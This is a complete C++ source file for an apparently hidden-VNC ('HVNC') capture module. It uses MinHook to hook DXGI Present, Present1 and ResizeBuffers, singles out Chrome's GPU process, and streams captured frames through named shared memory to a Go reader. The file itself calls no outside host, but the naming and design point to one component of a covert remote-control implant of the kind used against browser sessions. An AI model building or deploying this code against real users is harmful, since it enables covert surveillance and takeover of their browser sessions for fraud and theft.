//===============================================================================================//
// HVNCCapture — DXGI SwapChain::Present hook implementation.
//
// Compiled as C++ (CompileAsCpp in vcxproj). Uses C++ COM calling convention
// (obj->Method(...) rather than obj->lpVtbl->Method(obj, ...)).
//
// Strategy:
//   1. Create a temporary D3D11 device + swapchain to get the vtable address
//      of IDXGISwapChain::Present (vtable index 8) and Present1 (index 22).
//   2. Hook both via MinHook.
//   3. On each Present call, use the swapchain's GetBuffer(0) to get the
//      backbuffer as an ID3D11Texture2D, copy it to a staging texture,
//      Map it, and write the BGRA pixels into the shared memory section.
//   4. Signal the named event so the Go reader knows a frame is ready.
//===============================================================================================//
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <d3d11.h>
#include <dxgi1_2.h>
#include <stdio.h>
#include <string.h>

#include "MinHook.h"
#include "DXGICapture.h"

#ifdef __cplusplus
extern "C" {
#endif

//-----------------------------------------------------------------------------------------------//
// Forward declarations
//-----------------------------------------------------------------------------------------------//
typedef HRESULT(STDMETHODCALLTYPE* PFN_Present)(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags);
typedef HRESULT(STDMETHODCALLTYPE* PFN_Present1)(IDXGISwapChain1* pSwapChain, UINT SyncInterval, UINT PresentFlags, const DXGI_PRESENT_PARAMETERS* pPresentParameters);
typedef HRESULT(STDMETHODCALLTYPE* PFN_ResizeBuffers)(IDXGISwapChain* pSwapChain, UINT BufferCount, UINT Width, UINT Height, DXGI_FORMAT NewFormat, UINT SwapChainFlags);

static HRESULT STDMETHODCALLTYPE HookedPresent(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags);
static HRESULT STDMETHODCALLTYPE HookedPresent1(IDXGISwapChain1* pSwapChain, UINT SyncInterval, UINT PresentFlags, const DXGI_PRESENT_PARAMETERS* pPresentParameters);
static HRESULT STDMETHODCALLTYPE HookedResizeBuffers(IDXGISwapChain* pSwapChain, UINT BufferCount, UINT Width, UINT Height, DXGI_FORMAT NewFormat, UINT SwapChainFlags);

//-----------------------------------------------------------------------------------------------//
// Globals
//-----------------------------------------------------------------------------------------------//
static PFN_Present         g_OrigPresent       = NULL;
static PFN_Present1        g_OrigPresent1      = NULL;
static PFN_ResizeBuffers   g_OrigResizeBuffers = NULL;

// Staging resources — double-buffered to avoid blocking Map calls
static ID3D11Device*        g_Device       = NULL;
static ID3D11DeviceContext* g_Context      = NULL;
static ID3D11Texture2D*    g_Staging[2]   = {NULL, NULL};
static UINT                g_StagingW     = 0;
static UINT                g_StagingH     = 0;
static DXGI_FORMAT         g_StagingFmt   = DXGI_FORMAT_UNKNOWN;
static UINT                g_WriteIdx     = 0;      // CopyResource target index
static BOOL                g_HasPrevFrame = FALSE;   // previous staging has valid data

// Shared memory
static HANDLE  g_ShmHandle  = NULL;
static void*   g_ShmView    = NULL;
static SIZE_T  g_ShmSize    = 0;
static HANDLE  g_FrameEvent = NULL;
static UINT64  g_FrameSeq   = 0;

// Frequency for timestamps
static LARGE_INTEGER g_PerfFreq;

// Rate limiting — don't copy more than ~60 fps worth of frames
static LARGE_INTEGER g_LastFrameTime;
static const LONGLONG g_MinFrameIntervalUs = 16000; // ~60fps

// Critical section for thread safety
static CRITICAL_SECTION g_Lock;
static BOOL g_LockInitialized = FALSE;

// Primary swap chain tracking — only capture the largest one in the GPU process
static IDXGISwapChain* g_PrimarySwapChain = NULL;
static UINT g_PrimaryArea = 0;
static UINT g_PrimaryResetCounter = 0;

// Minimum backbuffer dimensions worth capturing (skip internal surfaces)
#define MIN_CAPTURE_WIDTH  128
#define MIN_CAPTURE_HEIGHT 128
#define PRIMARY_RESET_INTERVAL 300  // re-evaluate primary every ~5s at 60fps

//-----------------------------------------------------------------------------------------------//
// Helpers
//-----------------------------------------------------------------------------------------------//
#ifndef ENABLE_DEBUG_LOGGING
#define ENABLE_DEBUG_LOGGING 1
#endif

static void DebugLog(const char* fmt, ...) {
#if ENABLE_DEBUG_LOGGING
    char buf[1024];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    OutputDebugStringA(buf);
#else
    (void)fmt;
#endif
}

static UINT64 GetTimestampNs(void) {
    LARGE_INTEGER now;
    QueryPerformanceCounter(&now);
    return (UINT64)((double)now.QuadPart * 1000000000.0 / (double)g_PerfFreq.QuadPart);
}

static void BuildShmName(char* out, size_t outLen) {
    DWORD pid = GetCurrentProcessId();
    snprintf(out, outLen, "%s%lu", HVNC_SHM_PREFIX, (unsigned long)pid);
}

static void BuildEventName(char* out, size_t outLen) {
    DWORD pid = GetCurrentProcessId();
    snprintf(out, outLen, "%s%lu", HVNC_EVENT_PREFIX, (unsigned long)pid);
}

//-----------------------------------------------------------------------------------------------//
// Shared memory management
//-----------------------------------------------------------------------------------------------//
static BOOL EnsureSharedMemory(UINT width, UINT height) {
    UINT stride = width * 4;
    SIZE_T needed = sizeof(HVNCFrameHeader) + (SIZE_T)stride * height;

    if (g_ShmView && g_ShmSize >= needed) {
        return TRUE;
    }

    if (g_ShmView) { UnmapViewOfFile(g_ShmView); g_ShmView = NULL; }
    if (g_ShmHandle) { CloseHandle(g_ShmHandle); g_ShmHandle = NULL; }
    g_ShmSize = 0;

    char shmName[128];
    BuildShmName(shmName, sizeof(shmName));

    wchar_t wShmName[128];
    MultiByteToWideChar(CP_ACP, 0, shmName, -1, wShmName, 128);

    DWORD sizeHigh = (DWORD)(needed >> 32);
    DWORD sizeLow  = (DWORD)(needed & 0xFFFFFFFF);

    g_ShmHandle = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, sizeHigh, sizeLow, wShmName);
    if (!g_ShmHandle) {
        DebugLog("[HVNCCapture] CreateFileMappingW failed: %lu\n", GetLastError());
        return FALSE;
    }

    g_ShmView = MapViewOfFile(g_ShmHandle, FILE_MAP_WRITE, 0, 0, needed);
    if (!g_ShmView) {
        DebugLog("[HVNCCapture] MapViewOfFile failed: %lu\n", GetLastError());
        CloseHandle(g_ShmHandle);
        g_ShmHandle = NULL;
        return FALSE;
    }

    g_ShmSize = needed;

    if (!g_FrameEvent) {
        char evtName[128];
        BuildEventName(evtName, sizeof(evtName));
        wchar_t wEvtName[128];
        MultiByteToWideChar(CP_ACP, 0, evtName, -1, wEvtName, 128);
        g_FrameEvent = CreateEventW(NULL, FALSE, FALSE, wEvtName);
    }

    DebugLog("[HVNCCapture] Shared memory created: %s (%zu bytes, %ux%u)\n", shmName, needed, width, height);
    return TRUE;
}

//-----------------------------------------------------------------------------------------------//
// Staging texture management (double-buffered)
//-----------------------------------------------------------------------------------------------//
static BOOL EnsureStaging(ID3D11Device* device, UINT width, UINT height, DXGI_FORMAT fmt) {
    if (g_Staging[0] && g_Staging[1] && g_StagingW == width && g_StagingH == height && g_StagingFmt == fmt) {
        return TRUE;
    }

    if (g_Staging[0]) { g_Staging[0]->Release(); g_Staging[0] = NULL; }
    if (g_Staging[1]) { g_Staging[1]->Release(); g_Staging[1] = NULL; }
    g_HasPrevFrame = FALSE;
    g_WriteIdx = 0;

    // Normalise typeless formats to their UNORM equivalents for staging
    DXGI_FORMAT stageFmt = fmt;
    switch (fmt) {
    case DXGI_FORMAT_B8G8R8A8_TYPELESS: stageFmt = DXGI_FORMAT_B8G8R8A8_UNORM; break;
    case DXGI_FORMAT_R8G8B8A8_TYPELESS: stageFmt = DXGI_FORMAT_R8G8B8A8_UNORM; break;
    case DXGI_FORMAT_R10G10B10A2_TYPELESS: stageFmt = DXGI_FORMAT_R10G10B10A2_UNORM; break;
    case DXGI_FORMAT_R16G16B16A16_TYPELESS: stageFmt = DXGI_FORMAT_R16G16B16A16_FLOAT; break;
    default: break;
    }

    D3D11_TEXTURE2D_DESC desc;
    ZeroMemory(&desc, sizeof(desc));
    desc.Width = width;
    desc.Height = height;
    desc.MipLevels = 1;
    desc.ArraySize = 1;
    desc.Format = stageFmt;
    desc.SampleDesc.Count = 1;
    desc.SampleDesc.Quality = 0;
    desc.Usage = D3D11_USAGE_STAGING;
    desc.CPUAccessFlags = D3D11_CPU_ACCESS_READ;
    desc.BindFlags = 0;
    desc.MiscFlags = 0;

    HRESULT hr = device->CreateTexture2D(&desc, NULL, &g_Staging[0]);
    if (FAILED(hr)) {
        DebugLog("[HVNCCapture] CreateTexture2D staging[0] failed: 0x%08x fmt=%u\n", hr, (unsigned)stageFmt);
        return FALSE;
    }
    hr = device->CreateTexture2D(&desc, NULL, &g_Staging[1]);
    if (FAILED(hr)) {
        DebugLog("[HVNCCapture] CreateTexture2D staging[1] failed: 0x%08x fmt=%u\n", hr, (unsigned)stageFmt);
        g_Staging[0]->Release(); g_Staging[0] = NULL;
        return FALSE;
    }

    g_StagingW = width;
    g_StagingH = height;
    g_StagingFmt = fmt;
    DebugLog("[HVNCCapture] Staging textures created: %ux%u fmt=%u\n", width, height, (unsigned)stageFmt);
    return TRUE;
}

// Is this a 32-bit-per-pixel BGRA/RGBA format we can directly memcpy?
static BOOL IsCopyable32bpp(DXGI_FORMAT fmt) {
    switch (fmt) {
    case DXGI_FORMAT_B8G8R8A8_UNORM:
    case DXGI_FORMAT_B8G8R8A8_UNORM_SRGB:
    case DXGI_FORMAT_B8G8R8A8_TYPELESS:
    case DXGI_FORMAT_R8G8B8A8_UNORM:
    case DXGI_FORMAT_R8G8B8A8_UNORM_SRGB:
    case DXGI_FORMAT_R8G8B8A8_TYPELESS:
        return TRUE;
    default:
        return FALSE;
    }
}

//-----------------------------------------------------------------------------------------------//
// Core frame capture — called from Present hooks (SEH-protected)
//-----------------------------------------------------------------------------------------------//
static void CaptureFrameInner(IDXGISwapChain* pSwapChain) {
    // Rate limit
    LARGE_INTEGER now;
    QueryPerformanceCounter(&now);
    LONGLONG elapsedUs = (now.QuadPart - g_LastFrameTime.QuadPart) * 1000000 / g_PerfFreq.QuadPart;
    if (elapsedUs < g_MinFrameIntervalUs) {
        return;
    }
    g_LastFrameTime = now;

    // Get the backbuffer
    ID3D11Texture2D* backbuffer = NULL;
    HRESULT hr = pSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (void**)&backbuffer);
    if (FAILED(hr) || !backbuffer) {
        return;
    }

    // Get device/context from the backbuffer if not cached
    if (!g_Device) {
        ((ID3D11Resource*)backbuffer)->GetDevice(&g_Device);
        if (g_Device) {
            g_Device->GetImmediateContext(&g_Context);
        }
    }

    if (!g_Device || !g_Context) {
        backbuffer->Release();
        return;
    }

    D3D11_TEXTURE2D_DESC bbDesc;
    backbuffer->GetDesc(&bbDesc);

    UINT w = bbDesc.Width;
    UINT h = bbDesc.Height;

    if (w == 0 || h == 0 || w > HVNC_MAX_WIDTH || h > HVNC_MAX_HEIGHT) {
        backbuffer->Release();
        return;
    }

    // Skip tiny internal surfaces (tooltips, scrollbars, compositor layers)
    if (w < MIN_CAPTURE_WIDTH || h < MIN_CAPTURE_HEIGHT) {
        backbuffer->Release();
        return;
    }

    // Track the primary (largest) swap chain — Chrome GPU process serves many
    UINT area = w * h;
    g_PrimaryResetCounter++;
    if (g_PrimaryResetCounter >= PRIMARY_RESET_INTERVAL) {
        g_PrimarySwapChain = NULL;
        g_PrimaryArea = 0;
        g_PrimaryResetCounter = 0;
    }
    if (g_PrimarySwapChain == NULL || pSwapChain == g_PrimarySwapChain) {
        g_PrimarySwapChain = pSwapChain;
        if (area > g_PrimaryArea) g_PrimaryArea = area;
    } else if (area > g_PrimaryArea) {
        g_PrimarySwapChain = pSwapChain;
        g_PrimaryArea = area;
    } else {
        backbuffer->Release();
        return;
    }

    // Only capture 32bpp BGRA/RGBA formats we can handle
    if (!IsCopyable32bpp(bbDesc.Format)) {
        backbuffer->Release();
        return;
    }

    if (!EnsureStaging(g_Device, w, h, bbDesc.Format)) {
        backbuffer->Release();
        return;
    }

    if (!EnsureSharedMemory(w, h)) {
        backbuffer->Release();
        return;
    }

    UINT writeIdx = g_WriteIdx;
    UINT readIdx  = 1 - writeIdx;

    // Copy backbuffer to the write staging texture (async GPU op, returns immediately)
    if (bbDesc.SampleDesc.Count > 1) {
        D3D11_TEXTURE2D_DESC resolveDesc = bbDesc;
        resolveDesc.SampleDesc.Count = 1;
        resolveDesc.SampleDesc.Quality = 0;
        resolveDesc.Usage = D3D11_USAGE_DEFAULT;
        resolveDesc.BindFlags = 0;
        resolveDesc.CPUAccessFlags = 0;
        resolveDesc.MiscFlags = 0;

        ID3D11Texture2D* resolved = NULL;
        hr = g_Device->CreateTexture2D(&resolveDesc, NULL, &resolved);
        if (SUCCEEDED(hr) && resolved) {
            g_Context->ResolveSubresource(resolved, 0, backbuffer, 0, bbDesc.Format);
            g_Context->CopyResource(g_Staging[writeIdx], resolved);
            resolved->Release();
        } else {
            backbuffer->Release();
            return;
        }
    } else {
        g_Context->CopyResource(g_Staging[writeIdx], backbuffer);
    }

    backbuffer->Release();

    // Flip staging index for next frame
    g_WriteIdx = readIdx;

    // On first frame, nothing to read yet
    if (!g_HasPrevFrame) {
        g_HasPrevFrame = TRUE;
        return;
    }

    // Map the READ staging (previous frame) — non-blocking to avoid stalling Chrome's GPU thread
    D3D11_MAPPED_SUBRESOURCE mapped;
    hr = g_Context->Map(g_Staging[readIdx], 0, D3D11_MAP_READ, D3D11_MAP_FLAG_DO_NOT_WAIT, &mapped);
    if (hr == DXGI_ERROR_WAS_STILL_DRAWING) {
        return;  // GPU hasn't finished the previous copy — skip
    }
    if (FAILED(hr)) {
        DebugLog("[HVNCCapture] Map failed: 0x%08x\n", hr);
        return;
    }

    UINT dstStride = w * 4;
    UINT srcPitch = mapped.RowPitch;
    BYTE* dst = (BYTE*)g_ShmView + sizeof(HVNCFrameHeader);
    BYTE* src = (BYTE*)mapped.pData;

    for (UINT y = 0; y < h; y++) {
        memcpy(dst + (SIZE_T)y * dstStride, src + (SIZE_T)y * srcPitch, dstStride);
    }

    g_Context->Unmap(g_Staging[readIdx], 0);

    // Write header (AFTER pixel data + barrier so reader sees consistent data)
    g_FrameSeq++;
    HVNCFrameHeader* hdr = (HVNCFrameHeader*)g_ShmView;
    hdr->magic      = HVNC_FRAME_MAGIC;
    hdr->version    = HVNC_FRAME_VERSION;
    hdr->width      = w;
    hdr->height     = h;
    hdr->stride     = dstStride;
    hdr->format     = (UINT32)bbDesc.Format;
    hdr->frameSeq   = g_FrameSeq;
    hdr->timestampNs = GetTimestampNs();
    hdr->pid        = GetCurrentProcessId();
    hdr->reserved   = 0;

    MemoryBarrier();

    if (g_FrameEvent) {
        SetEvent(g_FrameEvent);
    }
}

static void CaptureFrame(IDXGISwapChain* pSwapChain) {
    if (!g_LockInitialized) return;

    if (!TryEnterCriticalSection(&g_Lock)) return;  // skip if ResizeBuffers holds the lock
    __try {
        CaptureFrameInner(pSwapChain);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DebugLog("[HVNCCapture] SEH exception 0x%08x in CaptureFrame — skipping frame\n",
                 GetExceptionCode());
    }
    LeaveCriticalSection(&g_Lock);
}

//-----------------------------------------------------------------------------------------------//
// Hooked functions
//-----------------------------------------------------------------------------------------------//
static HRESULT STDMETHODCALLTYPE HookedPresent(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags) {
    CaptureFrame(pSwapChain);
    return g_OrigPresent(pSwapChain, SyncInterval, Flags);
}

static HRESULT STDMETHODCALLTYPE HookedPresent1(IDXGISwapChain1* pSwapChain, UINT SyncInterval, UINT PresentFlags, const DXGI_PRESENT_PARAMETERS* pPresentParameters) {
    CaptureFrame((IDXGISwapChain*)pSwapChain);
    return g_OrigPresent1(pSwapChain, SyncInterval, PresentFlags, pPresentParameters);
}

static HRESULT STDMETHODCALLTYPE HookedResizeBuffers(IDXGISwapChain* pSwapChain, UINT BufferCount, UINT Width, UINT Height, DXGI_FORMAT NewFormat, UINT SwapChainFlags) {
    EnterCriticalSection(&g_Lock);
    if (g_Staging[0]) { g_Staging[0]->Release(); g_Staging[0] = NULL; }
    if (g_Staging[1]) { g_Staging[1]->Release(); g_Staging[1] = NULL; }
    g_StagingW = 0; g_StagingH = 0; g_StagingFmt = DXGI_FORMAT_UNKNOWN;
    g_HasPrevFrame = FALSE; g_WriteIdx = 0;
    g_PrimarySwapChain = NULL; g_PrimaryArea = 0; g_PrimaryResetCounter = 0;
    if (g_Context) { g_Context->Release(); g_Context = NULL; }
    if (g_Device)  { g_Device->Release();  g_Device  = NULL; }
    LeaveCriticalSection(&g_Lock);

    return g_OrigResizeBuffers(pSwapChain, BufferCount, Width, Height, NewFormat, SwapChainFlags);
}

//-----------------------------------------------------------------------------------------------//
// vtable discovery — create a dummy swapchain to get Present address
//-----------------------------------------------------------------------------------------------//
static BOOL GetDXGIPresent(void** ppPresent, void** ppPresent1, void** ppResizeBuffers) {
    *ppPresent = NULL;
    *ppPresent1 = NULL;
    *ppResizeBuffers = NULL;

    HMODULE hD3D11 = GetModuleHandleA("d3d11.dll");
    if (!hD3D11) hD3D11 = LoadLibraryA("d3d11.dll");
    if (!hD3D11) {
        DebugLog("[HVNCCapture] d3d11.dll not available\n");
        return FALSE;
    }

    typedef HRESULT(WINAPI* PFN_D3D11CreateDeviceAndSwapChain)(
        IDXGIAdapter*, D3D_DRIVER_TYPE, HMODULE, UINT, const D3D_FEATURE_LEVEL*,
        UINT, UINT, const DXGI_SWAP_CHAIN_DESC*, IDXGISwapChain**, ID3D11Device**,
        D3D_FEATURE_LEVEL*, ID3D11DeviceContext**);

    PFN_D3D11CreateDeviceAndSwapChain pCreate =
        (PFN_D3D11CreateDeviceAndSwapChain)GetProcAddress(hD3D11, "D3D11CreateDeviceAndSwapChain");
    if (!pCreate) {
        DebugLog("[HVNCCapture] D3D11CreateDeviceAndSwapChain not found\n");
        return FALSE;
    }

    HWND hWnd = GetDesktopWindow();

    DXGI_SWAP_CHAIN_DESC scd;
    ZeroMemory(&scd, sizeof(scd));
    scd.BufferCount = 1;
    scd.BufferDesc.Width = 2;
    scd.BufferDesc.Height = 2;
    scd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
    scd.BufferDesc.RefreshRate.Numerator = 60;
    scd.BufferDesc.RefreshRate.Denominator = 1;
    scd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;
    scd.OutputWindow = hWnd;
    scd.SampleDesc.Count = 1;
    scd.Windowed = TRUE;
    scd.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;

    IDXGISwapChain* pSwapChain = NULL;
    ID3D11Device* pDevice = NULL;
    ID3D11DeviceContext* pCtx = NULL;
    D3D_FEATURE_LEVEL featureLevel;

    HRESULT hr = pCreate(NULL, D3D_DRIVER_TYPE_HARDWARE, NULL, 0, NULL, 0,
        D3D11_SDK_VERSION, &scd, &pSwapChain, &pDevice, &featureLevel, &pCtx);

    if (FAILED(hr) || !pSwapChain) {
        hr = pCreate(NULL, D3D_DRIVER_TYPE_WARP, NULL, 0, NULL, 0,
            D3D11_SDK_VERSION, &scd, &pSwapChain, &pDevice, &featureLevel, &pCtx);
    }

    if (FAILED(hr) || !pSwapChain) {
        DebugLog("[HVNCCapture] Failed to create dummy swapchain: 0x%08x\n", hr);
        if (pCtx) pCtx->Release();
        if (pDevice) pDevice->Release();
        if (pSwapChain) pSwapChain->Release();
        return FALSE;
    }

    // Extract vtable pointers via raw vtable read
    // IDXGISwapChain: Present is at index 8, ResizeBuffers at index 13
    void** vtable = *(void***)pSwapChain;
    *ppPresent = vtable[8];
    *ppResizeBuffers = vtable[13];

    // Try to get Present1 from IDXGISwapChain1
    IDXGISwapChain1* pSwapChain1 = NULL;
    hr = pSwapChain->QueryInterface(__uuidof(IDXGISwapChain1), (void**)&pSwapChain1);
    if (SUCCEEDED(hr) && pSwapChain1) {
        void** vtable1 = *(void***)pSwapChain1;
        // IDXGISwapChain1: Present1 is at vtable index 22
        *ppPresent1 = vtable1[22];
        pSwapChain1->Release();
    }

    pCtx->Release();
    pDevice->Release();
    pSwapChain->Release();

    DebugLog("[HVNCCapture] vtable Present=%p Present1=%p ResizeBuffers=%p\n",
             *ppPresent, *ppPresent1, *ppResizeBuffers);
    return TRUE;
}

//-----------------------------------------------------------------------------------------------//
// Public API
//-----------------------------------------------------------------------------------------------//
void InstallDXGICapture(void) {
    QueryPerformanceFrequency(&g_PerfFreq);
    QueryPerformanceCounter(&g_LastFrameTime);

    InitializeCriticalSection(&g_Lock);
    g_LockInitialized = TRUE;

    MH_STATUS status = MH_Initialize();
    if (status != MH_OK && status != MH_ERROR_ALREADY_INITIALIZED) {
        DebugLog("[HVNCCapture] MH_Initialize failed: %d\n", status);
        return;
    }

    void* pPresent = NULL;
    void* pPresent1 = NULL;
    void* pResizeBuffers = NULL;

    if (!GetDXGIPresent(&pPresent, &pPresent1, &pResizeBuffers)) {
        DebugLog("[HVNCCapture] Failed to discover DXGI vtable\n");
        return;
    }

    if (pPresent) {
        status = MH_CreateHook(pPresent, (LPVOID)HookedPresent, (LPVOID*)&g_OrigPresent);
        if (status == MH_OK) {
            MH_EnableHook(pPresent);
            DebugLog("[HVNCCapture] Present hooked at %p\n", pPresent);
        } else {
            DebugLog("[HVNCCapture] MH_CreateHook Present failed: %d\n", status);
        }
    }

    if (pPresent1) {
        status = MH_CreateHook(pPresent1, (LPVOID)HookedPresent1, (LPVOID*)&g_OrigPresent1);
        if (status == MH_OK) {
            MH_EnableHook(pPresent1);
            DebugLog("[HVNCCapture] Present1 hooked at %p\n", pPresent1);
        } else {
            DebugLog("[HVNCCapture] MH_CreateHook Present1 failed: %d\n", status);
        }
    }

    if (pResizeBuffers) {
        status = MH_CreateHook(pResizeBuffers, (LPVOID)HookedResizeBuffers, (LPVOID*)&g_OrigResizeBuffers);
        if (status == MH_OK) {
            MH_EnableHook(pResizeBuffers);
            DebugLog("[HVNCCapture] ResizeBuffers hooked at %p\n", pResizeBuffers);
        } else {
            DebugLog("[HVNCCapture] MH_CreateHook ResizeBuffers failed: %d\n", status);
        }
    }

    DebugLog("[HVNCCapture] DXGI hooks installed (PID %lu)\n", GetCurrentProcessId());
}

void RemoveDXGICapture(void) {
    if (g_OrigPresent)       { MH_DisableHook((LPVOID)g_OrigPresent);       MH_RemoveHook((LPVOID)g_OrigPresent); }
    if (g_OrigPresent1)      { MH_DisableHook((LPVOID)g_OrigPresent1);      MH_RemoveHook((LPVOID)g_OrigPresent1); }
    if (g_OrigResizeBuffers) { MH_DisableHook((LPVOID)g_OrigResizeBuffers); MH_RemoveHook((LPVOID)g_OrigResizeBuffers); }

    MH_Uninitialize();

    if (g_LockInitialized) {
        EnterCriticalSection(&g_Lock);
    }

    if (g_Staging[0]) { g_Staging[0]->Release(); g_Staging[0] = NULL; }
    if (g_Staging[1]) { g_Staging[1]->Release(); g_Staging[1] = NULL; }
    if (g_Context)    { g_Context->Release();    g_Context = NULL; }
    if (g_Device)     { g_Device->Release();     g_Device = NULL; }

    if (g_ShmView)    { UnmapViewOfFile(g_ShmView);  g_ShmView = NULL; }
    if (g_ShmHandle)  { CloseHandle(g_ShmHandle);    g_ShmHandle = NULL; }
    if (g_FrameEvent) { CloseHandle(g_FrameEvent);   g_FrameEvent = NULL; }

    if (g_LockInitialized) {
        LeaveCriticalSection(&g_Lock);
        DeleteCriticalSection(&g_Lock);
        g_LockInitialized = FALSE;
    }

    DebugLog("[HVNCCapture] Cleaned up\n");
}

#ifdef __cplusplus
}
#endif
